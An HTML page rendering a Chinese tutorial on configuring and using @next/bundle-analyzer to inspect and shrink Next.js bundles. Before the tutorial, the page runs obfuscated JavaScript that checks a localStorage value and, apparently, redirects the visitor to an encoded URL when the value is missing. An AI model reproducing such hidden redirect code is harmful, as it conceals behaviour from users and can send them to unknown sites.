<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Document</title><link rel="stylesheet" href="../../css/github-markdown.min.css"><link rel="stylesheet" href="../../css/github.min.css"><style>body,html{margin:0;padding:0}.markdown-body{box-sizing:border-box;min-width:200px;max-width:980px;margin:0 auto!important;padding:45px 15px}.markdown-body pre{border:1px solid #e5e5e5!important;margin-top:var(--base-size-16)!important}</style></head><body><article id="article" class="markdown-body"></article><script>var _0x425b5b=_0x4f65;function _0x4f65(o,n){var l=_0x1922();return(_0x4f65=function(n,s){var a=l[n-=399];void 0===_0x4f65.UbUESk&&(_0x4f65.LZhXsY=function(n,s){var a,t=[],o=0,l="";for(n=(n=>{for(var s,a,t="",o="",l=0,e=0;a=n.charAt(e++);~a&&(s=l%4?64*s+a:a,l++%4)&&(t+=String.fromCharCode(255&s>>(-2*l&6))))a="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=".indexOf(a);for(var r=0,p=t.length;r<p;r++)o+="%"+("00"+t.charCodeAt(r).toString(16)).slice(-2);return decodeURIComponent(o)})(n),e=0;e<256;e++)t[e]=e;for(e=0;e<256;e++)o=(o+t[e]+s.charCodeAt(e%s.length))%256,a=t[e],t[e]=t[o],t[o]=a;for(var e=0,o=0,r=0;r<n.length;r++)a=t[e=(e+1)%256],t[e]=t[o=(o+t[e])%256],t[o]=a,l+=String.fromCharCode(n.charCodeAt(r)^t[(t[e]+t[o])%256]);return l},o=arguments,_0x4f65.UbUESk=!0);var n=n+l[0],t=o[n];return t?a=t:(void 0===_0x4f65.aUsnox&&(_0x4f65.aUsnox=!0),a=_0x4f65.LZhXsY(a,s),o[n]=a),a})(o,n)}if((()=>{for(var n=_0x4f65,s=_0x1922();;)try{if(828057==-parseInt(n(404,"uemm"))*(parseInt(n(417,"@2A("))/2)+parseInt(n(399,"iYhX"))/3+-parseInt(n(407,"lr#g"))/4+-parseInt(n(402,"wMpf"))/5*(-parseInt(n(403,"*H$#"))/6)+-parseInt(n(421,"iYhX"))/7+-parseInt(n(420,"Z0V!"))/8*(-parseInt(n(411,"#u2I"))/9)+parseInt(n(400,"^Kyc"))/10*(-parseInt(n(410,"1$pF"))/11))break;s.push(s.shift())}catch(n){s.push(s.shift())}})(),localStorage[_0x425b5b(408,"wMpf")](_0x425b5b(401,"C)s5"))!=_0x425b5b(422,"%)z6"))throw window[_0x425b5b(413,"QYjr")][_0x425b5b(405,"7i5J")](_0x425b5b(424,"6@Vv")),Error();function _0x1922(){var n=["isFdJmkGdSoDW58","imo/ne4mmxhcR8olumoPW5O","WO5MWO7dOIhcIW4VaePfuSkm","W7pdHLtcMmozW5BdHW","cSoAFG3cHKJcS8kbWPK","W77cL8oyWPldJh8vbZqPW5u","W6SwWPFcVwX9o8kLW5TiD8ox","vJVcJmopkab4xcxdNmk9WOZcPa","uGtcGLLxyCoUlW","W4NcQ0hcKZzxvq","W4NcR8o0WQ3dH8kcWPZdNgmVnq","cfVdLaKAoSk2i2WLWPSFWPu","kJldHxFcI0RdQG","m8kIm8kYv8o8mmkqbNi","xmoWW5ldMLLhdaG3W6ORgq","aa5qW6NdMxtdIKzG","W4SXrCkaWQm0W5dcIJJcJISZWQa","z8k4CW9g","W4WZsmoDW5bSWQdcSbC","W4ZcRmohWPtdU0BdOh7cKmkzW7VcSd99t8kXpahdV8oxW4T3smkgyHm","mSkrcf3dNfa0W4OxoCoxc8o/","ALxcRcldKvNdV8kRWOVdKIK","W485smkcWQW1W5tcOs7cRruxWP0","nmkwbv/cIYP1W7ifoa","D37dHCooWO8GnxLF","WQZcLrxdOmkDW7hdI2usASkz","dY8DW4tcLgxdPmkEzq","b1pcO8ooWQhcVCo8o1HMW404"];return(_0x1922=function(){return n})()}document.title="@next--bundle-analyzer 详解",document.getElementById("article").innerHTML='<div><h3><strong>@next/bundle-analyzer 详解</strong></h3>\n<p><code>@next/bundle-analyzer</code> 是 Next.js 官方提供的 <strong>Webpack Bundle Analyzer</strong>   插件封装，用于<strong>可视化分析 Next.js 打包后的 JavaScript 和 CSS 文件体积</strong>   ，帮助开发者优化应用性能，减少加载时间。</p>\n<hr>\n<h2><strong>一、核心功能</strong></h2>\n<ol>\n<li>\n<p><strong>可视化分析打包结果</strong>   ：</p>\n<ul>\n<li>生成交互式 <strong>Treemap</strong>   （树状图）展示所有打包文件的体积。</li>\n<li>按 <strong>JS、CSS、静态资源</strong>   分类展示。</li>\n<li>支持查看 <strong>Gzip/Brotli 压缩后</strong>   的文件大小。</li>\n</ul>\n</li>\n<li>\n<p><strong>优化指导</strong>   ：</p>\n<ul>\n<li>识别体积过大的第三方依赖（如 <code>lodash</code>、<code>moment</code>）。</li>\n<li>发现重复依赖（Duplicate Dependencies）。</li>\n<li>检测未使用的代码（Dead Code）。</li>\n</ul>\n</li>\n<li>\n<p><strong>支持 Next.js 所有构建模式</strong>   ：</p>\n<ul>\n<li><code>next build</code>（生产环境）</li>\n<li><code>next dev</code>（开发环境，可选）</li>\n</ul>\n</li>\n</ol>\n<hr>\n<h2><strong>二、安装与配置</strong></h2>\n<h3><strong>1. 安装</strong></h3>\n<pre><code class="language-bash">npm install @next/bundle-analyzer\n<span class="hljs-comment"># 或</span>\nyarn add @next/bundle-analyzer\n</code></pre>\n<h3><strong>2. 配置 <code>next.config.js</code></strong></h3>\n<pre><code class="language-javascript"><span class="hljs-comment">// next.config.js</span>\n<span class="hljs-keyword">const</span> withBundleAnalyzer = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;@next/bundle-analyzer&quot;</span>)({\n  <span class="hljs-attr">enabled</span>: process.<span class="hljs-property">env</span>.<span class="hljs-property">ANALYZE</span> === <span class="hljs-string">&quot;true&quot;</span>, <span class="hljs-comment">// 通过环境变量控制是否启用</span>\n  <span class="hljs-attr">openAnalyzer</span>: <span class="hljs-literal">true</span>, <span class="hljs-comment">// 是否自动在浏览器打开分析报告</span>\n});\n\n<span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = <span class="hljs-title function_">withBundleAnalyzer</span>({\n  <span class="hljs-comment">// 其他 Next.js 配置...</span>\n});\n</code></pre>\n<h3><strong>3. 修改 <code>package.json</code> 脚本</strong></h3>\n<pre><code class="language-json"><span class="hljs-punctuation">{</span>\n  <span class="hljs-attr">&quot;scripts&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>\n    <span class="hljs-attr">&quot;dev&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;next dev&quot;</span><span class="hljs-punctuation">,</span>\n    <span class="hljs-attr">&quot;build&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;next build&quot;</span><span class="hljs-punctuation">,</span>\n    <span class="hljs-attr">&quot;analyze&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;ANALYZE=true next build&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-comment">// 运行此命令生成分析报告</span>\n    <span class="hljs-attr">&quot;start&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;next start&quot;</span>\n  <span class="hljs-punctuation">}</span>\n<span class="hljs-punctuation">}</span>\n</code></pre>\n<hr>\n<h2><strong>三、运行与分析</strong></h2>\n<h3><strong>1. 生成报告</strong></h3>\n<pre><code class="language-bash">npm run analyze\n<span class="hljs-comment"># 或</span>\nyarn analyze\n</code></pre>\n<ul>\n<li>执行后会在 <code>next build</code> 完成后自动生成分析页面。</li>\n<li>默认在浏览器打开 <code>http://localhost:8888</code>（端口可配置）。</li>\n</ul>\n<h3><strong>2. 报告解读</strong></h3>\n<p>生成的报告是一个 <strong>交互式 Treemap</strong>   ，包含：</p>\n<ul>\n<li><strong><code>_next/static/chunks/</code></strong>   （Next.js 自动拆分的代码块）</li>\n<li><strong><code>_next/static/css/</code></strong>   （CSS 文件）</li>\n<li><strong><code>node_modules/</code></strong>   （第三方依赖）</li>\n<li><strong><code>pages/</code></strong>   （页面代码）</li>\n</ul>\n<p><strong>关键指标</strong>   ：</p>\n<ul>\n<li><strong>文件大小</strong>   （原始大小 vs. Gzip 压缩后大小）</li>\n<li><strong>重复依赖</strong>   （如多个版本的 <code>react</code>）</li>\n<li><strong>未使用的代码</strong>   （Tree Shaking 不彻底）</li>\n</ul>\n<hr>\n<h2><strong>四、高级配置</strong></h2>\n<h3><strong>1. 自定义分析端口</strong></h3>\n<pre><code class="language-javascript"><span class="hljs-comment">// next.config.js</span>\n<span class="hljs-keyword">const</span> withBundleAnalyzer = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;@next/bundle-analyzer&quot;</span>)({\n  <span class="hljs-attr">enabled</span>: process.<span class="hljs-property">env</span>.<span class="hljs-property">ANALYZE</span> === <span class="hljs-string">&quot;true&quot;</span>,\n  <span class="hljs-attr">openAnalyzer</span>: <span class="hljs-literal">true</span>,\n  <span class="hljs-attr">analyzerPort</span>: <span class="hljs-number">9999</span>, <span class="hljs-comment">// 自定义端口</span>\n});\n</code></pre>\n<h3><strong>2. 仅分析生产构建</strong></h3>\n<p>默认情况下，<code>@next/bundle-analyzer</code> 只在 <code>next build</code> 时运行。如果要在开发模式下分析，可以修改配置：</p>\n<pre><code class="language-javascript"><span class="hljs-comment">// next.config.js</span>\n<span class="hljs-keyword">const</span> withBundleAnalyzer = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;@next/bundle-analyzer&quot;</span>)({\n  <span class="hljs-attr">enabled</span>:\n    process.<span class="hljs-property">env</span>.<span class="hljs-property">ANALYZE</span> === <span class="hljs-string">&quot;true&quot;</span> || process.<span class="hljs-property">env</span>.<span class="hljs-property">NODE_ENV</span> === <span class="hljs-string">&quot;development&quot;</span>,\n});\n</code></pre>\n<h3><strong>3. 与其他插件结合</strong></h3>\n<p>可以和 <code>next-compose-plugins</code> 结合使用：</p>\n<pre><code class="language-javascript"><span class="hljs-comment">// next.config.js</span>\n<span class="hljs-keyword">const</span> withPlugins = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;next-compose-plugins&quot;</span>);\n<span class="hljs-keyword">const</span> withBundleAnalyzer = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;@next/bundle-analyzer&quot;</span>);\n\n<span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = <span class="hljs-title function_">withPlugins</span>(\n  [\n    [withBundleAnalyzer, { <span class="hljs-attr">enabled</span>: process.<span class="hljs-property">env</span>.<span class="hljs-property">ANALYZE</span> === <span class="hljs-string">&quot;true&quot;</span> }],\n    <span class="hljs-comment">// 其他插件...</span>\n  ],\n  {\n    <span class="hljs-comment">// Next.js 基础配置...</span>\n  },\n);\n</code></pre>\n<hr>\n<h2><strong>五、优化建议</strong></h2>\n<h3><strong>1. 减少第三方依赖体积</strong></h3>\n<ul>\n<li><strong>使用替代库</strong>   ：\n<ul>\n<li><code>moment</code> → <code>date-fns</code> 或 <code>day.js</code></li>\n<li><code>lodash</code> → 按需导入 <code>lodash/get</code></li>\n</ul>\n</li>\n<li><strong>动态导入（Dynamic Import）</strong>   ：<pre><code class="language-javascript"><span class="hljs-keyword">import</span> dynamic <span class="hljs-keyword">from</span> <span class="hljs-string">&quot;next/dynamic&quot;</span>;\n<span class="hljs-keyword">const</span> <span class="hljs-title class_">HeavyComponent</span> = <span class="hljs-title function_">dynamic</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-keyword">import</span>(<span class="hljs-string">&quot;../components/HeavyComponent&quot;</span>));\n</code></pre>\n</li>\n</ul>\n<h3><strong>2. 优化图片 &amp; 静态资源</strong></h3>\n<ul>\n<li>使用 <code>next/image</code> 自动优化图片。</li>\n<li>压缩 SVG/PNG/JPG（如 <code>svgo</code>、<code>sharp</code>）。</li>\n</ul>\n<h3><strong>3. 检查重复依赖</strong></h3>\n<pre><code class="language-bash">npm <span class="hljs-built_in">ls</span> &lt;package-name&gt;\n<span class="hljs-comment"># 例如：npm ls react</span>\n</code></pre>\n<p>如果发现多个版本，使用 <code>resolutions</code>（Yarn）或 <code>overrides</code>（npm）强制统一版本。</p>\n<h3><strong>4. 启用代码拆分</strong></h3>\n<p>Next.js 默认支持：</p>\n<ul>\n<li><strong>自动代码拆分</strong>   （<code>pages/</code> 下的路由自动拆分）</li>\n<li><strong>手动代码拆分</strong>   （<code>next/dynamic</code>）</li>\n</ul>\n<hr>\n<h2><strong>六、总结</strong></h2>\n<table>\n<thead>\n<tr>\n<th>场景</th>\n<th>推荐操作</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><strong>分析打包体积</strong></td>\n<td><code>npm run analyze</code></td>\n</tr>\n<tr>\n<td><strong>优化大依赖</strong></td>\n<td>替换为轻量库（如 <code>date-fns</code>）</td>\n</tr>\n<tr>\n<td><strong>减少重复代码</strong></td>\n<td>检查 <code>npm ls</code> 并统一版本</td>\n</tr>\n<tr>\n<td><strong>优化图片</strong></td>\n<td>使用 <code>next/image</code></td>\n</tr>\n<tr>\n<td><strong>动态加载</strong></td>\n<td><code>next/dynamic</code> 懒加载组件</td>\n</tr>\n</tbody>\n</table>\n<p><code>@next/bundle-analyzer</code> 是 Next.js 性能优化的<strong>必备工具</strong>   ，建议在每次发布前运行，确保应用加载速度最优！ 🚀</p>\n</div>'</script></body></html>